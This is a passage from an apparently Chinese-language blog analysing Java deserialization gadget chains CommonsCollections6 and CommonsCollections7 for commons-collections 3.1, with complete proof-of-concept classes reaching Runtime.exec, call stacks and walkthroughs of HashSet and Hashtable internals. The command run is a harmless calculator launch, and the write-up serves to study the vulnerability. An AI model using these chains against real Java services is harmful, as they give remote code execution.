<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                                    <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;,</span><br><span class="line">                                    <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">                        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, chain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">        hashset.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashSetField</span> <span class="operator">=</span> HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        hashSetField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashsetMap</span> <span class="operator">=</span> (HashMap) hashSetField.get(hashset);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashMapTable</span> <span class="operator">=</span> HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        hashMapTable.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] array = (Object[]) hashMapTable.get(hashsetMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">            node = array[<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        key.set(node, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC6&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashset);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC6&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-6">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">120</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">55</span>, CC6</span><br></pre></td></tr></table></figure>
<h2 id="分析-5">分析</h2>
<p>不同之处在于，<strong>CC5</strong>使用了<strong>TiedMapEntry</strong>的<strong>toString</strong>方法来触发，而<strong>CC6</strong>使用了<strong>hashCode</strong>方法来触发。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.getValue();</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">this</span>.getKey() == <span class="literal">null</span> ? <span class="number">0</span> : <span class="built_in">this</span>.getKey().hashCode()) ^ (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而触发<strong>hashCode</strong>的话，<strong>CC6</strong>选用了<strong>HashMap</strong>类的<strong>put</strong>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> V <span class="title function_">put</span><span class="params">(K key, V value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>跟进<strong>hash</strong>方法可以看见继续调用了<strong>key.hashCode</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后接着回溯，<strong>HashSet</strong>类的<strong>writeObject</strong>方法会写入<strong>map</strong>变量的所有<strong>key</strong>合集。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">        s.writeObject(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到这个<strong>map</strong>变量的类型正好是<strong>HashMap</strong>类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> HashMap&lt;E,Object&gt; map;</span><br></pre></td></tr></table></figure>
<p>而<strong>readObject</strong>则将其读取后进行<strong>put</strong>操作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">E</span> <span class="variable">e</span> <span class="operator">=</span> (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<strong>HashMap</strong>类中，<strong>key</strong>位于<strong>Node</strong>变量中，因此需要将构造好的<strong>TiedMapEntry</strong>链置于<strong>HashSet</strong>类的<strong>map→table→key</strong>中。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HashMap</span>&lt;K,V&gt; <span class="keyword">extends</span> <span class="title class_">AbstractMap</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>&lt;K,V&gt;, Cloneable, Serializable &#123;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Node</span>&lt;K,V&gt; <span class="keyword">implements</span> <span class="title class_">Map</span>.Entry&lt;K,V&gt; &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> hash;</span><br><span class="line">        <span class="keyword">final</span> K key;</span><br><span class="line">        V value;</span><br><span class="line">        Node&lt;K,V&gt; next;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而因为上述这一条链的一系列变量基本是<strong>private
transient</strong>修饰，因此<strong>CC6</strong>的构造需要嵌套多个反射，如下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, <span class="number">123</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">HashSet</span> <span class="variable">hashset</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">hashset.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashSet&quot;</span>).getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashset_map</span> <span class="operator">=</span> (HashMap) field.get(hashset);</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">table</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.HashMap&quot;</span>).getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">table.setAccessible(<span class="literal">true</span>);</span><br><span class="line">Object[] array = (Object[]) table.get(hashset_map);</span><br><span class="line"></span><br><span class="line"><span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (node == <span class="literal">null</span>) &#123;</span><br><span class="line">    node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">key</span> <span class="operator">=</span> node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">key.setAccessible(<span class="literal">true</span>);</span><br><span class="line">key.set(node, tiedmap);</span><br></pre></td></tr></table></figure>
<p>和反序列化的调用链。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">getValue:<span class="number">73</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hashCode:<span class="number">120</span>, TiedMapEntry (org.apache.commons.collections.keyvalue)</span><br><span class="line">hash:<span class="number">338</span>, HashMap (java.util)</span><br><span class="line">put:<span class="number">611</span>, HashMap (java.util)</span><br><span class="line">readObject:<span class="number">334</span>, HashSet (java.util)</span><br></pre></td></tr></table></figure>
<h1 id="commonscollections7">CommonsCollections7</h1>
<h2 id="影响版本-6">影响版本</h2>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="poc-7">POC</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;&#125;);</span><br><span class="line">        Transformer[] transformers =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                            <span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                            <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                            <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;open -a Calculator&quot;</span>&#125;)</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;aa&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;bB&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> transformerChain.getClass().getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;aa&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./CC7&quot;</span>));</span><br><span class="line">            outputStream.writeObject(hashtable);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./CC7&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用栈-7">调用栈</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">exec:<span class="number">347</span>, Runtime (java.lang)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">transform:<span class="number">125</span>, InvokerTransformer (org.apache.commons.collections.functors)</span><br><span class="line">transform:<span class="number">122</span>, ChainedTransformer (org.apache.commons.collections.functors)</span><br><span class="line">get:<span class="number">151</span>, LazyMap (org.apache.commons.collections.map)</span><br><span class="line">equals:<span class="number">472</span>, AbstractMap (java.util)</span><br><span class="line">equals:<span class="number">129</span>, AbstractMapDecorator (org.apache.commons.collections.map)</span><br><span class="line">reconstitutionPut:<span class="number">1221</span>, Hashtable (java.util)</span><br><span class="line">readObject:<span class="number">1195</span>, Hashtable (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">invokeReadObject:<span class="number">1058</span>, ObjectStreamClass (java.io)</span><br><span class="line">readSerialData:<span class="number">1900</span>, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:<span class="number">1801</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject0:<span class="number">1351</span>, ObjectInputStream (java.io)</span><br><span class="line">readObject:<span class="number">371</span>, ObjectInputStream (java.io)</span><br><span class="line">main:<span class="number">57</span>, CC7</span><br></pre></td></tr></table></figure>
<h2 id="分析-6">分析</h2>
<p><strong>Hashtable#readObject</strong>调用了<strong>Hashtable#reconstitutionPut</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K)s.readObject();</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        reconstitutionPut(table, key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>Hashtable#reconstitutionPut</strong>继续触发<strong>AbstractMap#equals</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reconstitutionPut</span><span class="params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span> <span class="keyword">throws</span> StreamCorruptedException &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>AbstractMap#equals</strong>再转到<strong>m.get</strong>，那么使得传入的<strong>key</strong>是构造好的<strong>transformerChain</strong>即可。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">        <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">            Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> e.getKey();</span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> e.getValue();</span><br><span class="line">            <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!(m.get(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!value.equals(m.get(key)))</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>确定输出后，研究一下如何构造输入，<strong>Hashtable#writeObject</strong>是直接将<strong>table</strong>变量中的<strong>key</strong>遍历后写入，那么思路就是获取<strong>table</strong>并修改值。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Entry&lt;Object, Object&gt; entryStack = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>) &#123;</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; table.length; index++) &#123;</span><br><span class="line">            Entry&lt;?,?&gt; entry = table[index];</span><br><span class="line">            <span class="keyword">while</span> (entry != <span class="literal">null</span>) &#123;</span><br><span class="line">                entryStack =</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">Entry</span>&lt;&gt;(<span class="number">0</span>, entry.key, entry.value, entryStack);</span><br><span class="line">                entry = entry.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Write out the key/value objects from the stacked entries</span></span><br><span class="line">    <span class="keyword">while</span> (entryStack != <span class="literal">null</span>) &#123;</span><br><span class="line">        s.writeObject(entryStack.key);</span><br><span class="line">        s.writeObject(entryStack.value);</span><br><span class="line">        entryStack = entryStack.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>和其他链的不同之处做个笔记。</p>
